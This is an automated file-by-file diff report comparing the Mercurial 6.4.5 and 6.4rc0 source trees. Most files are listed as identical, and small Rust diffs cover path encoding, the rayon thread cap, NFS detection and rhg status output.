### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/filelog.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/filelog.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/index.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/index.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/manifest.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/manifest.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/mod.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/mod.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/node.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/node.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/nodemap.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/nodemap.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/nodemap_docket.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/nodemap_docket.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/patch.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/patch.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/path_encode.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/path_encode.rs`

 * *Files 2% similar despite different names*

```diff
@@ -541,23 +541,17 @@
     dest.write_bytes(b"dh/");
 
     if let Some(last_slash) = last_slash {
         for slice in src[..last_slash].split(|b| *b == b'/') {
             let slice = &slice[..std::cmp::min(slice.len(), dirprefixlen)];
             if dest.len() + slice.len() > maxshortdirslen + 3 {
                 break;
+            } else {
+                dest.write_bytes(slice);
             }
-            if let Some(last_char) = slice.last() {
-                if *last_char == b'.' || *last_char == b' ' {
-                    dest.write_bytes(&slice[0..slice.len() - 1]);
-                    dest.write_byte(b'_');
-                } else {
-                    dest.write_bytes(slice);
-                }
-            };
             dest.write_byte(b'/');
         }
     }
 
     let used = dest.len() + 40 + ext.len();
 
     if MAXSTOREPATHLEN > used {
@@ -612,25 +606,14 @@
 
 #[cfg(test)]
 mod tests {
     use super::*;
     use crate::utils::hg_path::HgPathBuf;
 
     #[test]
-    fn test_dirname_ends_with_underscore() {
-        let input = b"data/dir1234.foo/ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJ.i";
-        let expected = b"dh/dir1234_/abcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghij.if2e9ce59e095eff5f8f334dc809e65606a0aa50b.i";
-        let res = path_encode(input);
-        assert_eq!(
-            HgPathBuf::from_bytes(&res),
-            HgPathBuf::from_bytes(expected)
-        );
-    }
-
-    #[test]
     fn test_long_filename_at_root() {
         let input = b"data/ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJ.i";
         let expected = b"dh/abcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghij.i708243a2237a7afae259ea3545a72a2ef11c247b.i";
         let res = path_encode(input);
         assert_eq!(
             HgPathBuf::from_bytes(&res),
             HgPathBuf::from_bytes(expected)
```

### Comparing `mercurial-6.4.5/rust/hg-core/src/revset.rs` & `mercurial-6.4rc0/rust/hg-core/src/revset.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/sparse.rs` & `mercurial-6.4rc0/rust/hg-core/src/sparse.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/testing.rs` & `mercurial-6.4rc0/rust/hg-core/src/testing.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/utils/debug.rs` & `mercurial-6.4rc0/rust/hg-core/src/utils/debug.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/utils/files.rs` & `mercurial-6.4rc0/rust/hg-core/src/utils/files.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/utils/hg_path.rs` & `mercurial-6.4rc0/rust/hg-core/src/utils/hg_path.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/utils/path_auditor.rs` & `mercurial-6.4rc0/rust/hg-core/src/utils/path_auditor.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/utils.rs` & `mercurial-6.4rc0/rust/hg-core/src/utils.rs`

 * *Files 7% similar despite different names*

```diff
@@ -494,39 +494,7 @@
     F: Fn(A) -> Result<Option<B>, E> + 'a,
 {
     iter.filter_map(move |result| match result {
         Ok(node) => f(node).transpose(),
         Err(e) => Some(Err(e)),
     })
 }
-
-/// Force the global rayon threadpool to not exceed 16 concurrent threads
-/// unless the user has specified a value.
-/// This is a stop-gap measure until we figure out why using more than 16
-/// threads makes `status` slower for each additional thread.
-///
-/// TODO find the underlying cause and fix it, then remove this.
-///
-/// # Errors
-///
-/// Returns an error if the global threadpool has already been initialized if
-/// we try to initialize it.
-pub fn cap_default_rayon_threads() -> Result<(), rayon::ThreadPoolBuildError> {
-    const THREAD_CAP: usize = 16;
-
-    if std::env::var("RAYON_NUM_THREADS").is_err() {
-        let available_parallelism = std::thread::available_parallelism()
-            .map(usize::from)
-            .unwrap_or(1);
-        let new_thread_count = THREAD_CAP.min(available_parallelism);
-        let res = rayon::ThreadPoolBuilder::new()
-            .num_threads(new_thread_count)
-            .build_global();
-        if res.is_ok() {
-            log::trace!(
-                "Capped the rayon threadpool to {new_thread_count} threads",
-            );
-        }
-        return res;
-    }
-    Ok(())
-}
```

### Comparing `mercurial-6.4.5/rust/hg-core/src/vfs.rs` & `mercurial-6.4rc0/rust/hg-core/src/vfs.rs`

 * *Files 3% similar despite different names*

```diff
@@ -189,17 +189,7 @@
     unsafe {
         let mut buf: libc::statfs = mem::zeroed();
         let r = libc::statfs(path.as_ptr(), &mut buf);
 
         r == 0 && buf.f_type as u32 == libc::NFS_SUPER_MAGIC as u32
     }
 }
-
-/// Similar to what Cargo does; although detecting NFS (or non-local
-/// file systems) _should_ be possible on other operating systems,
-/// we'll just assume that mmap() works there, for now; after all,
-/// _some_ functionality is better than a compile error, i.e. none at
-/// all
-#[cfg(not(target_os = "linux"))]
-pub(crate) fn is_on_nfs_mount(_path: impl AsRef<Path>) -> bool {
-    false
-}
```

### Comparing `mercurial-6.4.5/rust/hg-core/tests/test_missing_ancestors.rs` & `mercurial-6.4rc0/rust/hg-core/tests/test_missing_ancestors.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/ancestors.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/ancestors.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/cindex.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/cindex.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/conversion.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/conversion.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/copy_tracing.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/copy_tracing.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dagops.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dagops.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/debug.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/debug.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate/copymap.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate/copymap.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate/dirs_multiset.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate/dirs_multiset.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate/dirstate_map.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate/dirstate_map.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate/item.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate/item.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate/status.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate/status.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/dirstate.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/dirstate.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/discovery.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/discovery.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/exceptions.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/exceptions.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/lib.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/lib.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/pybytes_deref.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/pybytes_deref.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/ref_sharing.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/ref_sharing.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/revlog.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/revlog.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-cpython/src/utils.rs` & `mercurial-6.4rc0/rust/hg-cpython/src/utils.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/.cargo/config` & `mercurial-6.4rc0/rust/hgcli/.cargo/config`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/Cargo.lock` & `mercurial-6.4rc0/rust/hgcli/Cargo.lock`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/Cargo.toml` & `mercurial-6.4rc0/rust/hgcli/Cargo.toml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/README.md` & `mercurial-6.4rc0/rust/hgcli/README.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/build.rs` & `mercurial-6.4rc0/rust/hgcli/build.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/pyoxidizer.bzl` & `mercurial-6.4rc0/rust/hgcli/pyoxidizer.bzl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hgcli/src/main.rs` & `mercurial-6.4rc0/rust/hgcli/src/main.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/Cargo.toml` & `mercurial-6.4rc0/rust/rhg/Cargo.toml`

 * *Files 1% similar despite different names*

```diff
@@ -18,8 +18,8 @@
 log = "0.4.17"
 logging_timer = "1.1.0"
 regex = "1.7.0"
 env_logger = "0.9.3"
 format-bytes = "0.3.0"
 users = "0.11.0"
 which = "4.3.0"
-rayon = "1.7.0"
+rayon = "1.6.1"
```

### Comparing `mercurial-6.4.5/rust/rhg/README.md` & `mercurial-6.4rc0/rust/rhg/README.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/blackbox.rs` & `mercurial-6.4rc0/rust/rhg/src/blackbox.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/color.rs` & `mercurial-6.4rc0/rust/rhg/src/color.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/cat.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/cat.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/config.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/config.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/debugdata.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/debugdata.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/debugignorerhg.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/debugignorerhg.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/debugrequirements.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/debugrequirements.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/debugrhgsparse.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/debugrhgsparse.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/files.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/files.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/root.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/root.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/commands/status.rs` & `mercurial-6.4rc0/rust/rhg/src/commands/status.rs`

 * *Files 2% similar despite different names*

```diff
@@ -538,38 +538,33 @@
         label: &'static str,
         mut paths: Vec<StatusPath<'_>>,
     ) -> Result<(), CommandError> {
         paths.sort_unstable();
         // TODO: get the stdout lock once for the whole loop
         // instead of in each write
         for StatusPath { path, copy_source } in paths {
-            let relative_path;
-            let relative_source;
-            let (path, copy_source) = if let Some(relativize) =
-                &self.relativize
-            {
-                relative_path = relativize.relativize(&path);
-                relative_source =
-                    copy_source.as_ref().map(|s| relativize.relativize(s));
-                (&*relative_path, relative_source.as_deref())
+            let relative;
+            let path = if let Some(relativize) = &self.relativize {
+                relative = relativize.relativize(&path);
+                &*relative
             } else {
-                (path.as_bytes(), copy_source.as_ref().map(|s| s.as_bytes()))
+                path.as_bytes()
             };
             // TODO: Add a way to use `write_bytes!` instead of `format_bytes!`
             // in order to stream to stdout instead of allocating an
             // itermediate `Vec<u8>`.
             if !self.no_status {
                 self.ui.write_stdout_labelled(status_prefix, label)?
             }
             self.ui
                 .write_stdout_labelled(&format_bytes!(b"{}\n", path), label)?;
-            if let Some(source) = copy_source.filter(|_| !self.no_status) {
+            if let Some(source) = copy_source {
                 let label = "status.copied";
                 self.ui.write_stdout_labelled(
-                    &format_bytes!(b"  {}\n", source),
+                    &format_bytes!(b"  {}\n", source.as_bytes()),
                     label,
                 )?
             }
         }
         Ok(())
     }
 }
```

### Comparing `mercurial-6.4.5/rust/rhg/src/error.rs` & `mercurial-6.4rc0/rust/rhg/src/error.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/main.rs` & `mercurial-6.4rc0/rust/rhg/src/main.rs`

 * *Files 1% similar despite different names*

```diff
@@ -136,21 +136,14 @@
     // Run this first, before we find out if the blackbox extension is even
     // enabled, in order to include everything in-between in the duration
     // measurements. Reading config files can be slow if theyre on NFS.
     let process_start_time = blackbox::ProcessStartTime::now();
 
     env_logger::init();
 
-    // Make sure nothing in a future version of `rhg` sets the global
-    // threadpool before we can cap default threads. (This is also called
-    // in core because Python uses the same code path, we're adding a
-    // redundant check.)
-    hg::utils::cap_default_rayon_threads()
-        .expect("Rayon threadpool already initialized");
-
     let early_args = EarlyArgs::parse(&argv);
 
     let initial_current_dir = early_args.cwd.map(|cwd| {
         let cwd = get_path_from_bytes(&cwd);
         std::env::current_dir()
             .and_then(|initial| {
                 std::env::set_current_dir(cwd)?;
```

### Comparing `mercurial-6.4.5/rust/rhg/src/ui.rs` & `mercurial-6.4rc0/rust/rhg/src/ui.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/rhg/src/utils/path_utils.rs` & `mercurial-6.4rc0/rust/rhg/src/utils/path_utils.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/setup.py` & `mercurial-6.4rc0/setup.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/.balto.toml` & `mercurial-6.4rc0/tests/.balto.toml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/artifacts/scripts/generate-churning-bundle.py` & `mercurial-6.4rc0/tests/artifacts/scripts/generate-churning-bundle.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/autodiff.py` & `mercurial-6.4rc0/tests/autodiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/basic_test_result.py` & `mercurial-6.4rc0/tests/basic_test_result.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/binfile.bin` & `mercurial-6.4rc0/tests/binfile.bin`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/blackbox-readonly-dispatch.py` & `mercurial-6.4rc0/tests/blackbox-readonly-dispatch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/blacklists/README` & `mercurial-6.4rc0/tests/blacklists/README`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/blacklists/fsmonitor` & `mercurial-6.4rc0/tests/blacklists/fsmonitor`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bruterebase.py` & `mercurial-6.4rc0/tests/bruterebase.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/darcs1.hg` & `mercurial-6.4rc0/tests/bundles/darcs1.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/hgweb+obs.hg` & `mercurial-6.4rc0/tests/bundles/hgweb+obs.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue4041.hg` & `mercurial-6.4rc0/tests/bundles/issue4041.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue4438-r1.hg` & `mercurial-6.4rc0/tests/bundles/issue4438-r1.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue4438-r2.hg` & `mercurial-6.4rc0/tests/bundles/issue4438-r2.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue6528.hg-v1` & `mercurial-6.4rc0/tests/bundles/issue6528.hg-v1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue6528.hg-v2` & `mercurial-6.4rc0/tests/bundles/issue6528.hg-v2`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/issue6528.tar` & `mercurial-6.4rc0/tests/bundles/issue6528.tar`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/legacy-encoding.hg` & `mercurial-6.4rc0/tests/bundles/legacy-encoding.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/rebase-revset.hg` & `mercurial-6.4rc0/tests/bundles/rebase-revset.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/rebase.hg` & `mercurial-6.4rc0/tests/bundles/rebase.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/remote.hg` & `mercurial-6.4rc0/tests/bundles/remote.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/remote.sh` & `mercurial-6.4rc0/tests/bundles/remote.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/renames.hg` & `mercurial-6.4rc0/tests/bundles/renames.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/tampered.hg` & `mercurial-6.4rc0/tests/bundles/tampered.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-invalid-branch-name.hg` & `mercurial-6.4rc0/tests/bundles/test-invalid-branch-name.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-manifest.hg` & `mercurial-6.4rc0/tests/bundles/test-manifest.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-merge-symlinks.hg` & `mercurial-6.4rc0/tests/bundles/test-merge-symlinks.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-no-symlinks.hg` & `mercurial-6.4rc0/tests/bundles/test-no-symlinks.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-revlog-diff-relative-to-nullrev.sh` & `mercurial-6.4rc0/tests/bundles/test-revlog-diff-relative-to-nullrev.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/bundles/test-revlog-diff-relative-to-nullrev.tar` & `mercurial-6.4rc0/tests/bundles/test-revlog-diff-relative-to-nullrev.tar`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/cgienv` & `mercurial-6.4rc0/tests/cgienv`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/check-perf-code.py` & `mercurial-6.4rc0/tests/check-perf-code.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/common-pattern.py` & `mercurial-6.4rc0/tests/common-pattern.py`

 * *Files 2% similar despite different names*

```diff
@@ -132,19 +132,14 @@
         # because of module member privacy.
         br'No such file or directory \(os error 2\)',
         # strerror()
         br'No such file or directory',
         # FormatMessage(ERROR_FILE_NOT_FOUND)
         br'The system cannot find the file specified',
     ),
-    br'$EACCES$': (
-        br'Permission denied \(os error 13\)',
-        # strerror
-        br'Permission denied',
-    ),
     br'$ENOTDIR$': (
         # strerror()
         br'Not a directory',
         # FormatMessage(ERROR_PATH_NOT_FOUND)
         br'The system cannot find the path specified',
     ),
     br'$ECONNRESET$': (
```

### Comparing `mercurial-6.4.5/tests/drawdag.py` & `mercurial-6.4rc0/tests/drawdag.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/dumbhttp.py` & `mercurial-6.4rc0/tests/dumbhttp.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/dummysmtpd.py` & `mercurial-6.4rc0/tests/dummysmtpd.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/dummyssh` & `mercurial-6.4rc0/tests/dummyssh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/f` & `mercurial-6.4rc0/tests/f`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/fakedirstatewritetime.py` & `mercurial-6.4rc0/tests/fakedirstatewritetime.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/fakemergerecord.py` & `mercurial-6.4rc0/tests/fakemergerecord.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/fakepatchtime.py` & `mercurial-6.4rc0/tests/fakepatchtime.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/filterpyflakes.py` & `mercurial-6.4rc0/tests/filterpyflakes.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/filtertraceback.py` & `mercurial-6.4rc0/tests/filtertraceback.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/flagprocessorext.py` & `mercurial-6.4rc0/tests/flagprocessorext.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/fsmonitor-run-tests.py` & `mercurial-6.4rc0/tests/fsmonitor-run-tests.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/generate-working-copy-states.py` & `mercurial-6.4rc0/tests/generate-working-copy-states.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/get-with-headers.py` & `mercurial-6.4rc0/tests/get-with-headers.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/gpg/pubring.gpg` & `mercurial-6.4rc0/tests/gpg/pubring.gpg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/gpg/secring.gpg` & `mercurial-6.4rc0/tests/gpg/secring.gpg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/gpg/trustdb.gpg` & `mercurial-6.4rc0/tests/gpg/trustdb.gpg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/helpers-testrepo.sh` & `mercurial-6.4rc0/tests/helpers-testrepo.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/heredoctest.py` & `mercurial-6.4rc0/tests/heredoctest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/hghave` & `mercurial-6.4rc0/tests/hghave`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/hghave.py` & `mercurial-6.4rc0/tests/hghave.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/hgterm.ti` & `mercurial-6.4rc0/tests/hgterm.ti`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/hgweberror.py` & `mercurial-6.4rc0/tests/hgweberror.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/httpserverauth.py` & `mercurial-6.4rc0/tests/httpserverauth.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/hypothesishelpers.py` & `mercurial-6.4rc0/tests/hypothesishelpers.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/killdaemons.py` & `mercurial-6.4rc0/tests/killdaemons.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/library-infinitepush.sh` & `mercurial-6.4rc0/tests/library-infinitepush.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/list-tree.py` & `mercurial-6.4rc0/tests/list-tree.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/lockdelay.py` & `mercurial-6.4rc0/tests/lockdelay.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/logexceptions.py` & `mercurial-6.4rc0/tests/logexceptions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/ls-l.py` & `mercurial-6.4rc0/tests/ls-l.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/md5sum.py` & `mercurial-6.4rc0/tests/md5sum.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/missing-comment.hg` & `mercurial-6.4rc0/tests/missing-comment.hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/notcapable` & `mercurial-6.4rc0/tests/notcapable`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/pdiff` & `mercurial-6.4rc0/tests/pdiff`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/accept-4564.json` & `mercurial-6.4rc0/tests/phabricator/accept-4564.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/accept-7913.json` & `mercurial-6.4rc0/tests/phabricator/accept-7913.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phab-conduit.json` & `mercurial-6.4rc0/tests/phabricator/phab-conduit.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabimport-multi-drev.json` & `mercurial-6.4rc0/tests/phabricator/phabimport-multi-drev.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabimport-stack.json` & `mercurial-6.4rc0/tests/phabricator/phabimport-stack.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabread-4480.json` & `mercurial-6.4rc0/tests/phabricator/phabread-4480.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabread-conduit-error.json` & `mercurial-6.4rc0/tests/phabricator/phabread-conduit-error.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabread-empty-drev.json` & `mercurial-6.4rc0/tests/phabricator/phabread-empty-drev.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabread-multi-drev.json` & `mercurial-6.4rc0/tests/phabricator/phabread-multi-drev.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabread-str-time.json` & `mercurial-6.4rc0/tests/phabricator/phabread-str-time.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-add-parent-setup.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-add-parent-setup.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-add-parent.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-add-parent.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-binary-renames.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-binary-renames.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-binary.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-binary.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-comment-created.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-comment-created.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-comment-updated.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-comment-updated.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-create-alpha.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-create-alpha.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-create-public.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-create-public.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-extend-end.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-extend-end.json`

 * *Files identical despite different names*

